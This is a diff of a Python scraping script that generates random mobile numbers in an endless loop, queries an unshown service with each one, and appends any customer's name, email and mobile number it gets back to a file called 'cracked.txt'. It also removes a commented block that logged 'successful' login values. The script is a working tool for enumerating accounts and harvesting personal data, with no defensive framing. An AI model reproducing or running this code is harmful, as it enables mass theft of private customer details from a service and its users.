@@ -1,13 +1,7 @@
-'''
-
-
-
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
-'''
 import requests
 from random import randint
 from bs4 import BeautifulSoup
-filename = "value.txt"
+f = open('cracked.txt','a') 
 def phoneNumber():
     number = str("01")
     number1 =str(randint(6,9))
@@ -46,21 +40,7 @@ while True:
             f.write(f"Name: {customer_name}\n")
             f.write(f"Email: {customer_email}\n")
             f.write(f"Mobile {customer_mobile}\n")
-            f.write("\n")
+            f.write("_______________J")
         print(number)
     except Exception as e:
         print(f"Error: {e}")
-         
-
-'''
-    txt = r.content
-    text = str(txt,'UTF-8')
-    userinfo = str(values)
-    if "successful!" in text:
-        print("Successful",values)
-        file.write(userinfo+'\n')
-        
-    else:
-        print("failed",values)
-'''
- 
